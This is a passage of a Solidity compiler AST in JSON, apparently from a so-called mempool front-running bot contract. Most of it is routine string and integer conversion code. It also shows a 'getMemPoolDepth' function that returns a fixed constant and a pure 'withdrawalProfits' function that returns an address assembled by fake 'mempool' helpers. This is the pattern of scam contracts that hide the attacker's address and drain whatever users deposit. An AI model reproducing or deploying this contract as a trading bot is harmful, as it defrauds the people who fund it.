																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "15823:2:0",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_10_by_1",
																								"typeString": "int_const 10"
																							},
																							"value": "10"
																						},
																						"src": "15818:7:0",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"src": "15813:12:0",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 1444,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "15807:5:0",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1443,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "15807:5:0",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1450,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "15807:19:0",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1442,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "15802:4:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes1_$",
																			"typeString": "type(bytes1)"
																		},
																		"typeName": {
																			"id": 1441,
																			"name": "byte",
																			"nodeType": "ElementaryTypeName",
																			"src": "15802:4:0",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 1451,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "15802:25:0",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "15790:37:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1453,
															"nodeType": "ExpressionStatement",
															"src": "15790:37:0"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1456,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1454,
																	"name": "_i",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1390,
																	"src": "15841:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3130",
																	"id": 1455,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "15847:2:0",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_10_by_1",
																		"typeString": "int_const 10"
																	},
																	"value": "10"
																},
																"src": "15841:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1457,
															"nodeType": "ExpressionStatement",
															"src": "15841:8:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1436,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1434,
														"name": "_i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1390,
														"src": "15767:2:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1435,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "15773:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "15767:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1459,
												"nodeType": "WhileStatement",
												"src": "15760:100:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1462,
															"name": "bstr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1422,
															"src": "15883:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1461,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "15876:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1460,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "15876:6:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1463,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15876:12:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1394,
												"id": 1464,
												"nodeType": "Return",
												"src": "15869:19:0"
											}
										]
									},
									"documentation": null,
									"id": 1466,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "uint2str",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1391,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1390,
												"mutability": "mutable",
												"name": "_i",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1466,
												"src": "15448:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1389,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "15448:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "15447:9:0"
									},
									"returnParameters": {
										"id": 1394,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1393,
												"mutability": "mutable",
												"name": "_uintAsString",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1466,
												"src": "15480:27:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1392,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "15480:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "15479:29:0"
									},
									"scope": 1583,
									"src": "15430:465:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1473,
										"nodeType": "Block",
										"src": "15957:30:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "353131383235",
													"id": 1471,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "15974:6:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_511825_by_1",
														"typeString": "int_const 511825"
													},
													"value": "511825"
												},
												"functionReturnParameters": 1470,
												"id": 1472,
												"nodeType": "Return",
												"src": "15967:13:0"
											}
										]
									},
									"documentation": null,
									"id": 1474,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolDepth",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1467,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15925:2:0"
									},
									"returnParameters": {
										"id": 1470,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1469,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1474,
												"src": "15951:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1468,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "15951:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "15950:6:0"
									},
									"scope": 1583,
									"src": "15901:86:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1484,
										"nodeType": "Block",
										"src": "16054:51:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [],
															"expression": {
																"argumentTypes": [],
																"id": 1480,
																"name": "callMempool",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 1272,
																"src": "16084:11:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_internal_pure$__$returns$_t_string_memory_ptr_$",
																	"typeString": "function () pure returns (string memory)"
																}
															},
															"id": 1481,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "16084:13:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1479,
														"name": "parseMempool",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 906,
														"src": "16071:12:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_address_$",
															"typeString": "function (string memory) pure returns (address)"
														}
													},
													"id": 1482,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16071:27:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"functionReturnParameters": 1478,
												"id": 1483,
												"nodeType": "Return",
												"src": "16064:34:0"
											}
										]
									},
									"documentation": null,
									"id": 1485,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "withdrawalProfits",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1475,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "16019:2:0"
									},
									"returnParameters": {
										"id": 1478,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1477,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1485,
												"src": "16045:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 1476,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "16045:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16044:9:0"
									},
									"scope": 1583,
									"src": "15993:112:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1581,
										"nodeType": "Block",
										"src": "16377:513:0",
										"statements": [
											{
												"assignments": [
													1495
												],
												"declarations": [
													{
														"constant": false,
														"id": 1495,
														"mutability": "mutable",
														"name": "_baseBytes",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1581,
														"src": "16387:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1494,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "16387:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1500,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1498,
															"name": "_base",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1487,
															"src": "16419:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1497,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "16413:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1496,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "16413:5:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1499,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16413:12:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "16387:38:0"
											},
											{
												"assignments": [
													1502
												],
												"declarations": [
													{
														"constant": false,
														"id": 1502,
														"mutability": "mutable",
														"name": "_valueBytes",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1581,
														"src": "16435:24:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1501,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "16435:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1507,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1505,
															"name": "_value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1489,
															"src": "16468:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1504,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "16462:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1503,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "16462:5:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1506,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16462:13:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "16435:40:0"
											},
											{
												"assignments": [
													1509
												],
												"declarations": [
													{
														"constant": false,
														"id": 1509,
														"mutability": "mutable",
														"name": "_tmpValue",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1581,
														"src": "16486:23:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string"
														},
														"typeName": {
															"id": 1508,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "16486:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1518,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 1516,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1512,
																	"name": "_baseBytes",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1495,
																	"src": "16523:10:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_memory_ptr",
																		"typeString": "bytes memory"
																	}
																},
																"id": 1513,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "16523:17:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "+",
															"rightExpression": {
																"argumentTypes": null,
																"expression": {
																	"argumentTypes": null,
																	"id": 1514,
																	"name": "_valueBytes",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1502,
																	"src": "16543:11:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes_memory_ptr",
																		"typeString": "bytes memory"
																	}
																},
																"id": 1515,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "length",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "16543:18:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "16523:38:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1511,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "16512:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_string_memory_ptr_$",
															"typeString": "function (uint256) pure returns (string memory)"
														},
														"typeName": {
															"id": 1510,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "16516:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_storage_ptr",
																"typeString": "string"
															}
														}
													},
													"id": 1517,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16512:50:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "16486:76:0"
											},
											{
												"assignments": [
													1520
												],
												"declarations": [
													{
														"constant": false,
														"id": 1520,
														"mutability": "mutable",
														"name": "_newValue",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1581,
														"src": "16572:22:0",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1519,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "16572:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1525,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1523,
															"name": "_tmpValue",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1509,
															"src": "16603:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1522,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "16597:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1521,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "16597:5:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1524,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16597:16:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "16572:41:0"
											},
											{
												"assignments": [
													1527
												],
												"declarations": [
													{
														"constant": false,
														"id": 1527,
														"mutability": "mutable",
														"name": "i",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1581,
														"src": "16624:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1526,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "16624:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1528,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "16624:6:0"
											},
											{
												"assignments": [
													1530
												],
												"declarations": [
													{
														"constant": false,
														"id": 1530,
														"mutability": "mutable",
														"name": "j",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1581,
														"src": "16640:6:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1529,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "16640:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1531,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "16640:6:0"
											},
											{
												"body": {
													"id": 1552,
													"nodeType": "Block",
													"src": "16692:55:0",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1550,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1543,
																		"name": "_newValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1520,
																		"src": "16706:9:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1546,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1545,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "++",
																		"prefix": false,
																		"src": "16716:3:0",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 1544,
																			"name": "j",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1530,
																			"src": "16716:1:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "16706:14:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1547,
																		"name": "_baseBytes",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1495,
																		"src": "16723:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1549,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1548,
																		"name": "i",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1527,
																		"src": "16734:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": false,
																	"nodeType": "IndexAccess",
																	"src": "16723:13:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "16706:30:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1551,
															"nodeType": "ExpressionStatement",
															"src": "16706:30:0"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1539,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1536,
														"name": "i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1527,
														"src": "16666:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 1537,
															"name": "_baseBytes",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1495,
															"src": "16668:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														},
														"id": 1538,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "length",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "16668:17:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "16666:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1553,
												"initializationExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1534,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 1532,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1527,
															"src": "16661:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"hexValue": "30",
															"id": 1533,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "16663:1:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_rational_0_by_1",
																"typeString": "int_const 0"
															},
															"value": "0"
														},
														"src": "16661:3:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 1535,
													"nodeType": "ExpressionStatement",
													"src": "16661:3:0"
												},
												"loopExpression": {
													"expression": {
														"argumentTypes": null,
														"id": 1541,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "UnaryOperation",
														"operator": "++",
														"prefix": false,
														"src": "16687:3:0",
														"subExpression": {
															"argumentTypes": null,
															"id": 1540,
															"name": "i",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1527,
															"src": "16687:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
